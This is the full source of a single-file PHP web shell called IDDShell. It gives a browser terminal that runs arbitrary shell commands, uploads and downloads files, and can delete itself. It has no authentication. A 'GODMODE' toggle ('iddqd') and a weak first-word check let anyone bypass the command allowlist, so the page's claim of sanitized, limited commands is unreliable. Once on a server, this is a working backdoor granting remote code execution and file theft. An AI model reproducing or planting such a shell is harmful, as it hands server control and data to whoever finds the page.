<?php
session_start();

$idd_version = "v1.0.0";
$kernel_info = shell_exec('uname -a') . "\n";
$userinfo = posix_getpwuid(posix_getuid());
$user = htmlspecialchars($userinfo['name']);
$current_dir = "";

$cwd = "hosting:~";
$prompt = $user . ":" . $cwd . "$ ";
$module_name = "IDDShell module";
$welcome_message = "Welcome to the " . $module_name ." " . $idd_version . "\n\n\n\nDrag and drop a file here to upload it to the server in the current directory. \nOr, type a command, press Enter, and hope for the best.\n";
$caution_message = "Be cautious when entering commands. Incorrect or malicious commands can harm the server. Use this shell only for administrative tasks.";

$greetings[0] = "iDD╭━━━━╮    ╭╮    ╭╮╭╮ " . $idd_version;
$greetings[1] = "╭━━╯ ╭━ ╰╮   ┃┃    ┃┃┃┃ by iddabi.dev";
$greetings[2] = "┃    ┃ • ┃╭━━┫╰━┳━━┫┃┃┃";
$greetings[3] = "┣╮   ╰━━╮┣┃━━┫╭╮┃ ━┫┃┃┃";
$greetings[4] = "┃┃ ╭━╮ ╭┫┃┣━━┃┃┃┃ ━┫╰┫╰╮";
$greetings[5] = " ╰━╯ ╰━╯╰╯╰━━┻╯╰┻━━┻━┻━╯";

$greetings_string = implode("\n", $greetings) . "\n";
$allowed_commands_hint = "The following commands are allowed:\n";

$allowed_commands = array('ls', 'cd', 'export', 'pwd', 'history', 'clear', 'zip', 'tar', 'cp', 'mkdir', 'php');
$buffer_max_lines = 512;
$current_dir = $_SESSION['current_dir'] ?? getcwd();

sort($allowed_commands);
foreach ($allowed_commands as $command) {
    $allowed_commands_hint .= "`$command`, ";
}
$allowed_commands_hint = substr($allowed_commands_hint, 0, -2);


$history_buffer = "[]";
$history_index = 0;
if (isset($_SESSION['history'])) {
    $history_buffer = json_encode($_SESSION['history']);
    $history_index = count($_SESSION['history']);
}

if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd(); // Set initial directory
}

if (isset($_POST['action']) && $_POST['action'] === 'iddshell_autocomplete') {
    $userInput = $_POST['userInput'] ?? '';
    $cwd = $_SESSION['current_dir'] ?? getcwd();
    $type = $_POST['type'] ?? 'file';

    $suggestions_array = iddshell_generateAutocomplete($userInput, $cwd, $type);
    response($suggestions_array);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'iddshell_upload_file' && isset($_FILES['file'])) {
    $uploadDir = $_SESSION['current_dir'];
    $originalFileName = basename($_FILES['file']['name']);
    $uploadFile = $uploadDir . "/" . $originalFileName;

    $fileInfo = pathinfo($originalFileName);
    $fileName = $fileInfo['filename'];
    $fileExtension = isset($fileInfo['extension']) ? '.' . $fileInfo['extension'] : '';
    $counter = 1;

    while (file_exists($uploadFile)) {
        $uploadFile = $uploadDir . "/" . $fileName . "_" . $counter . $fileExtension;
        $counter++;
    }

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo 'success';
    } else {
        echo 'error';
    }
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'iddshell_run_command' && isset($_POST['command'])) {

    $input = stripslashes(trim($_POST['command']));

    if (strpos($input, "!") !== 0) {
        $_SESSION['history'][] = $input;
    }


    switch (strtolower($input)) {
        case 'history':
            if (isset($_SESSION['history'])) {
                $h = "";
                foreach ($_SESSION['history'] as $k => $v) {
                    $h .= $k+1 . " " . $v . "\n";
                }
                response($h);
            }
            exit;
        case 'iddsessiondrop':
            iddshell_sessionDestroy();
            response("GODMODE_OFF");
            exit;
        case 'iddsessionvars':
            print_r($_SESSION);
            exit;
        case 'iddqd':
            $_SESSION['god_mode'] = !isset($_SESSION['god_mode']) ? true : !$_SESSION['god_mode'];
            response("GODMODE_" . ($_SESSION['god_mode'] ? "ON" : "OFF"));
            exit;
        case 'iddkill':
            unlink(__FILE__);
            die("{##X##}");
        default:

            if (preg_match("/^\s*download\s+(.+?)\s*(2>&1)?$/", $input, $match)) {
                $decodedFileName = $match[1];
                $decodedFileName = str_replace('\ ', ' ', $decodedFileName);
                iddshell_download($decodedFileName);

                exit;
            }

            $commands = preg_split('/[\n;]/', $input);
            $valid_commands = [];
            $has_invalid_command = false;

            foreach ($commands as $command) {
                $command = trim($command);
                if (empty($command)) continue;

                $parts = explode(" ", $command);

                if (!in_array($parts[0], $allowed_commands)) {
                    $has_invalid_command = true;
                    $invalid_command = $command;
                    break;
                }

                $valid_commands[] = $command;
            }

            if ($has_invalid_command && (!isset($_SESSION['god_mode']) || $_SESSION['god_mode'] !== true)) {
                response("Error: The command '$invalid_command' is not recognized or is not allowed. Please check the list of supported commands.");
            } else {
                if (!empty($valid_commands) || (isset($_SESSION['god_mode']) && $_SESSION['god_mode'] === true)) {

                    $all_valid_commands = implode(" && ", $valid_commands);
                    $full_command = sprintf("cd %s;%s 2>&1;echo [##`pwd`##]", $_SESSION['current_dir'], $input);
                    $output = shell_exec($full_command);

                    preg_match_all('/\[##(.*?)##\]/', $output, $matches);

                    if (!empty($matches[1])) {
                        $_SESSION['current_dir'] = $matches[1][0];
                    }

                    response($output);
                }
            }
            exit;
    }
}


function response($out): void {
    if (is_array($out) || is_object($out)) {
        header('Content-Type: application/json; charset=utf-8');
        $json = json_encode($out);
        if ($json === false) {
            http_response_code(500);
            echo json_encode(['error' => 'Failed to encode JSON']);
        } else {
            echo $json;
        }
    } elseif (is_string($out)) {
        if (strpos($out, 'application/octet-stream') !== false) {
            header('Content-Type: application/octet-stream');
            $fileName = 'downloaded_file'; // Replace with actual logic if needed
            header('Content-Disposition: attachment; filename="' . basename($fileName) . '"');
            echo $out;
        } elseif (file_exists($out) && strpos(mime_content_type($out), 'image') === 0) {
            header('Content-Type: ' . mime_content_type($out));
            readfile($out);
        } else {
            header('Content-Type: text/plain; charset=utf-8');
            echo rtrim($out) . "\n";
        }
    } else {
        http_response_code(400);
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode(['error' => 'Invalid response type']);
    }
}

function iddshell_sessionDestroy(): void
{
    if (session_status() == PHP_SESSION_NONE) {
        session_start();
    }

    session_unset();
    session_destroy();

    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]);
    }

    if (session_status() == PHP_SESSION_NONE) {
        session_start();
    }

    $_SESSION['current_dir'] = getcwd();
}

function iddshell_download($filePath): void
{
    if (!file_exists($filePath)) {
        response("Error: The file does not exist.");
        return;
    }

    if (!is_file($filePath)) {
        response("Error: The path is not a file, it may be a directory.");
        return;
    }

    $file = @file_get_contents($filePath);
    if ($file === false) {
        response("Error: The file could not be read or you do not have permission to access it.");
        return;
    }

    $fileName = basename($filePath);
    $fileSize = filesize($filePath);

    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $filePath);
    finfo_close($finfo);

    if ($mimeType === false) {
        $mimeType = 'application/octet-stream';
    }

    if (preg_match('/^image\//', $mimeType)) {
        header('Content-Type: ' . $mimeType); // For images, use their MIME type
    } else {
        header('Content-Type: application/octet-stream');
    }

    header('Content-Disposition: attachment; filename="' . $fileName . '"');
    header('Content-Length: ' . $fileSize);
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Expires: 0');

    readfile($filePath);
    exit;
}


function iddshell_generateAutocomplete($fileName, $cwd, $type): array
{
    chdir($cwd);

    if ($type === 'cmd') {
        $cmd = "compgen -c " . escapeshellarg($fileName);
    } else {
        $cmd = "compgen -f " . escapeshellarg($fileName);
    }

    $cmd = "/bin/bash -c \"$cmd\"";
    $items = explode("\n", trim(shell_exec($cmd)));

    foreach ($items as &$item) {
        $item = base64_encode($item);
    }

    return array(
        'suggestions' => $items,
        'cwd' => $cwd
    );
}

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <head>
        <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Expires" content="0">
    </head>
    <title><?php echo $module_name;?></title>
    <style>
        body {
            font-family: monospace;
            background-color: #1e1e1e;
            color: #d4d4d4;
        }
        .warning {
            color: #ff4500;
            margin-top: 10px;
        }
        #terminalInput {
            width: 100%;
            min-width: 720px;
            height: 400px;
            font-family: monospace;
            background-color: #2f2f2f;
            color: #9cdcfe;
            outline: none;
            padding: 10px;
            box-sizing: border-box;
            resize: vertical;
        }

         #commandForm .godmode,
         #commandForm .died {
            color: #fff3cd !important;
            border-color: #ff0000 !important;
            outline: none;
            background-image: url('https://idabi.dev/pub/images/watcher.png');
            background-color: #040508 !important;
            background-position: right center;
            background-repeat: no-repeat;
            /*background-size: cover;*/
        }
         #commandForm .died {
            background-image: url('https://images4.alphacoders.com/196/thumb-1920-196994.jpg');
        }
    </style>
</head>
<fieldset>
    <legend id="terminalLegend"><?php echo $current_dir;?></legend>
    <form id="commandForm" method="POST" action="">
        <textarea id="terminalInput" name="command" class="form-control <?php echo (isset($_SESSION['god_mode']) && $_SESSION['god_mode'] === true) ? "godmode" : "";?>" required placeholder="Type command, press Enter, and hope for the best." autofocus autocomplete="off" onMouseOver="this.focus();" spellcheck="false"><?php echo $kernel_info;?><?php echo $greetings_string . $welcome_message . $prompt;?></textarea>
    </form>
    </fieldset>

<script>
    let prompt = "<?php echo $prompt;?>";
    let history_buffer = <?php echo $history_buffer;?>;
    let history_index = <?php echo $history_index;?>;
    let iddShellAjax = "<?php echo htmlspecialchars("https://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']); ?>";
    let buffer_max_lines = <?php echo $buffer_max_lines;?>;
    let consoleElement = document.getElementById("terminalInput");

    function sendRequest(method, url, data, callback) {
        const xhr = new XMLHttpRequest();
        xhr.open(method, url, true);

        if (!(data instanceof FormData)) {
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        }

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 2) {
                const contentType = xhr.getResponseHeader('Content-Type');
                if (contentType && contentType.includes('application/json')) {
                    console.log("json");
                    xhr.responseType = 'json';
                } else if (contentType && contentType.includes('text/html')) {
                    console.log("text");
                    xhr.responseType = 'text';
                } else if (contentType && contentType.includes('text/plain')) {
                    console.log("text");
                    xhr.responseType = 'text';
                } else {
                    console.log("blob");
                    xhr.responseType = 'blob';
                }
            }

            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    try {
                        const contentType = xhr.getResponseHeader('Content-Type');

                        if (xhr.responseType === 'blob') {
                            callback(null, xhr);
                        } else if (contentType && contentType.includes('application/json')) {
                            callback(null, xhr);
                        } else {
                            callback(null, xhr);
                        }
                    } catch (error) {
                        callback(error, xhr);
                    }
                } else {
                    callback(new Error(`Request failed with status ${xhr.status}`), xhr);
                }
            }
        };

        xhr.send(data);
    }


    function cropBufferLines(text, lineCount = buffer_max_lines) {
        const lines = text.split("\n");

        const lastLines = lines.slice(-lineCount);

        return lastLines.join("\n");
    }

    document.addEventListener("DOMContentLoaded", function () {


        consoleElement.setSelectionRange(consoleElement.value.length, consoleElement.value.length);
        consoleElement.focus();

        consoleElement.addEventListener("click", function (event) {
            const rect = consoleElement.getBoundingClientRect();
            const x = event.clientX - rect.left;
            const y = event.clientY - rect.top;

            const position = consoleElement.selectionStart;

        });

        consoleElement.addEventListener('dragover', e => {
            e.preventDefault();
            consoleElement.style.borderStyle = "dashed";
        });
        consoleElement.addEventListener('dragleave', e => {
            consoleElement.style.borderStyle = "solid";
        });

        consoleElement.addEventListener('drop', e => {
            e.preventDefault();
            consoleElement.style.borderStyle = "solid";

            const files = e.dataTransfer.files;
            if (files.length) {
                const file = files[0];

                const formData = new FormData();
                formData.append('file', file); // Attach the file
                formData.append('action', 'iddshell_upload_file'); // Specify the action

                sendRequest(
                    'POST',
                    iddShellAjax,
                    formData, // Pass FormData
                    function (err, xhr) {
                        if (err) {
                            console.error('An error occurred during file upload:', err);
                            return;
                        }

                        const response = xhr.responseText;
                        console.log('Server response received:', response);
                        if (response.includes('success')) {
                            alert('The file has been uploaded successfully.');
                        } else {
                            alert('Failed to upload the file. Server response: ' + response);
                        }
                    }
                );
            }
        });

        consoleElement.addEventListener('keydown', function (event) {

            let text = consoleElement.value;

            let caretPosition = consoleElement.selectionStart;

            let promptIndexPosition = text.lastIndexOf(prompt);

            if (caretPosition < promptIndexPosition + prompt.length) {
                consoleElement.setSelectionRange(consoleElement.value.length, consoleElement.value.length);
            }

            if (promptIndexPosition !== -1) {
                promptIndexPosition += prompt.length;
            } else {
                promptIndexPosition = consoleElement.value.length;
            }

            if (event.key === 'Backspace' || event.key === 'ArrowLeft') {
                if (caretPosition <= promptIndexPosition) {
                    consoleElement.setSelectionRange(promptIndexPosition, promptIndexPosition);
                    event.preventDefault();
                }
                return;
            }

            if (event.key === 'ArrowUp' || event.key === 'ArrowDown') {
                event.preventDefault();

                let start = promptIndexPosition;
                let end = consoleElement.value.length;

                if (event.key === 'ArrowUp') {
                    if (history_index > 0) {
                        history_index--;
                        consoleElement.setRangeText(history_buffer[history_index], start, end, 'end');

                    }
                } else if (event.key === 'ArrowDown') {

                    if (history_index < history_buffer.length - 1) {
                        history_index++;

                        consoleElement.setRangeText(history_buffer[history_index], start, end, 'end');

                    } else {
                        history_index = history_buffer.length;
                        consoleElement.setRangeText("", start, end, 'end');
                    }
                }
                return;
            }

            if (event.key === 'Enter') {
                event.preventDefault();
                document.getElementById('commandForm').dispatchEvent(new Event('submit'));
            }

            if (event.key === 'Tab') {
                event.preventDefault();
                featureHint();
                return;
            }

            function featureHint() {
                let commandWithoutPrefix = "";
                const index = text.lastIndexOf(prompt.trim());
                if (index !== -1) {
                    commandWithoutPrefix = decodeURIComponent(text.substring(index + prompt.length)).trim();
                }
                if (commandWithoutPrefix === "") {
                    console.log("NOTHING TO SUGGEST");
                    return;
                }

                let currentCmd = commandWithoutPrefix.split(" ");
                let type = (currentCmd.length === 1) ? "cmd" : "file";
                let userInput = (currentCmd.length === 1) ? commandWithoutPrefix : currentCmd[currentCmd.length - 1];

                sendRequest(
                    "POST",
                    iddShellAjax,
                    `action=iddshell_autocomplete&userInput=${encodeURIComponent(userInput)}&type=${type}`,
                    (err, xhr) => {
                        if (err) {
                            console.error("Error during autocomplete:", err);
                            return;
                        }

                        try {
                            const contentType = xhr.getResponseHeader("Content-Type");

                            let res;
                            if (contentType && contentType.includes("application/json")) {
                                res = xhr.response;
                            } else {
                                console.warn("Unexpected response type, falling back to text.");
                                res = { suggestions: xhr.responseText.split("\n") };
                            }

                            const decodedSuggestions = res.suggestions.map((f) => atob(f)); // Base64 decoding

                            if (decodedSuggestions.length === 1) {
                                console.log(decodedSuggestions[0]);

                                const suggestion = decodedSuggestions[0];
                                const updatedCommand = suggestion.slice(userInput.length);
                                consoleElement.value += decodeURIComponent(updatedCommand);

                                return;
                            } else if (decodedSuggestions.length > 1) {
                                console.log(decodedSuggestions);

                                consoleElement.value += "\n" + prompt + commandWithoutPrefix + "\n";

                                const maxLength = Math.max(...decodedSuggestions.map((command) => command.length));

                                decodedSuggestions.forEach((command, index) => {
                                    consoleElement.value += `${command.padEnd(maxLength)}\t`;
                                    if ((index + 1) % 3 === 0) {
                                        consoleElement.value += "\n";
                                    }
                                });

                                consoleElement.value += "\n\n" + prompt + commandWithoutPrefix;
                                consoleElement.scrollTop = consoleElement.scrollHeight;
                                return;
                            }
                        } catch (error) {
                            console.error("Error processing autocomplete response:", error);
                        }
                    }
                );
            }
        });

        document.getElementById('commandForm').addEventListener('submit', function (event) {
            event.preventDefault();

            let terminalInputElement = document.getElementById('terminalInput');
            let buffer = terminalInputElement.value.trim();
            let commandWithoutPrefix = "";

            buffer = cropBufferLines(buffer);

            terminalInputElement.value = buffer;

            let index = buffer.lastIndexOf(prompt.trim());
            if (index !== -1) {
                commandWithoutPrefix = decodeURIComponent(buffer.substring(index + prompt.length)).trim();
            }

            if (commandWithoutPrefix !== "" && !commandWithoutPrefix.startsWith("!")) {

                history_buffer.push(commandWithoutPrefix);
                history_index = history_buffer.length;
            }

            if (commandWithoutPrefix === 'history') {
                history_buffer.forEach((command, index) => {
                    terminalInputElement.value += `\n${index + 1} ${command}`;
                });

                terminalInputElement.value += '\n\n' + prompt;
                terminalInputElement.scrollTop = terminalInputElement.scrollHeight;
                return;
            }

            if (commandWithoutPrefix.startsWith('!')) {
                const index = parseInt(commandWithoutPrefix.substring(1), 10);

                if (!isNaN(index) && index > 0 && index <= history_buffer.length) {
                    const historyCommand = history_buffer[index - 1];
                    terminalInputElement.value += `\n${historyCommand}`;
                    commandWithoutPrefix = historyCommand;
                } else {
                    terminalInputElement.value += `\nError: no command with number ${index} found in history`;
                    terminalInputElement.value += '\n' + prompt;
                    terminalInputElement.scrollTop = terminalInputElement.scrollHeight;
                    return;
                }
            }

            if (commandWithoutPrefix === "") {
                terminalInputElement.value += '\n' + prompt;
                terminalInputElement.scrollTop = terminalInputElement.scrollHeight;
                return;
            }

            if (commandWithoutPrefix === "clear") {
                terminalInputElement.value = prompt;
                return;
            }

            sendRequest(
                'POST',
                iddShellAjax,
                'action=iddshell_run_command&command=' + encodeURIComponent(commandWithoutPrefix),
                function (err, xhr) {
                    if (err) {
                        console.error('Error running command:', err);
                        return;
                    }

                    const contentDisposition = xhr.getResponseHeader('Content-Disposition');

                    if (xhr.responseType === 'blob' && contentDisposition && contentDisposition.includes('attachment')) {
                        const fileName = contentDisposition.split('filename=')[1].replace(/"/g, '');
                        const blob = new Blob([xhr.response], { type: 'application/octet-stream' });
                        const link = document.createElement('a');

                        link.href = URL.createObjectURL(blob);
                        link.download = fileName;
                        document.body.appendChild(link);
                        link.click();
                        document.body.removeChild(link);

                        terminalInputElement.value += '\n' + "File sent";

                    } else {
                        const responseText = xhr.responseText;

                        if (responseText.startsWith("GODMODE_")) {
                            const mode = responseText.trim().split('_')[1].toLowerCase();
                            terminalInputElement.classList.toggle("godmode", mode === "on");
                        }

                        const localOut = responseText.match(/\{##(.*?)##\}/);
                        if (localOut) {
                            const extractedText = localOut[1];
                            if (extractedText === "X") {
                                terminalInputElement.value = "\n\nHASTA LA VISTA!!!";
                                terminalInputElement.classList.add("died");
                                terminalInputElement.disabled = true;
                                const newElement = terminalInputElement.cloneNode(true);
                                terminalInputElement.parentNode.replaceChild(newElement, terminalInputElement);
                                return;
                            }
                        }

                        const systemOut = responseText.match(/\[##(.*?)##\]/);
                        if (systemOut) {
                            const extractedText = systemOut[1];
                            document.getElementById('terminalLegend').textContent = extractedText;
                            terminalInputElement.value += '\n' + responseText.replace(/\[##.*?##\]/g, "");
                        } else {
                            terminalInputElement.value += '\n' + responseText;
                        }
                    }

                    terminalInputElement.value += '\n' + prompt;
                    terminalInputElement.scrollTop = terminalInputElement.scrollHeight;
                }
            );
            terminalInputElement.scrollTop = terminalInputElement.scrollHeight;
        });
    });
</script>
<pre><?php echo rtrim($allowed_commands_hint, ',');?></pre>
<div class="description">
    <h2>PHP Web Terminal: Single-file PHP Shell <?php echo $module_name ." " . $idd_version; ?></h2>
    <p class="warning"><strong>WARNING: This script poses a significant security risk. Do not upload it to a server unless you fully understand its implications and have implemented robust security measures.</strong></p>
    <p>This lightweight, single-file PHP shell provides a web-based terminal interface, enabling users to execute shell commands on the server directly through a browser. Below are its key features:</p>

    <h3>Features:</h3>
    <ul>
        <li>Command history navigation using arrow keys (↑ ↓)</li>
        <li>Command and file name auto-completion with the Tab key</li>
        <li>Remote file system navigation via the <code>cd</code> command</li>
        <li>Drag-and-drop file uploads to the server</li>
        <li>File downloads using the <code>download &lt;file_name&gt;</code> command</li>
        <li><strong>Command Validation:</strong> Ensures only allowed commands (defined in <code>$allowed_commands</code>) are executed.</li>
        <li><strong>Session Management:</strong> Tracks the current working directory and supports GODMODE for unrestricted commands.</li>
        <li><strong>Special Commands:</strong>
            <ul>
                <li><code>iddsessionvars</code>: Show session variables.</li>
                <li><code>iddsessiondrop</code>: Resets the current session.</li>
                <li><code>idd**</code>: Toggles GODMODE for unrestricted execution.</li>
                <li><code>idd*****</code>: Deletes the script from the server.</li>
                <li><code>download &lt;file_path&gt;</code>: Downloads the specified file to the client.</li>
            </ul>
        </li>
        <li><strong>Interface:</strong> A minimal HTML interface styled like a terminal.</li>
        <li><strong>Command Recall:</strong> Recall and execute previous commands using <code>!&lt;number&gt;</code>.</li>
        <li><strong>Security:</strong> Limits executable commands in normal mode and sanitizes input to mitigate risks.</li>
    </ul>
    <h3>Important Notes:</h3>
    <ul>
        <li>This script is designed for administrative tasks and should only be used in secure, trusted environments.</li>
        <li>The single-file implementation simplifies deployment but increases security risks if exposed to unauthorized users, particularly with GODMODE enabled.</li>
    </ul>
</div>

</body>
</html>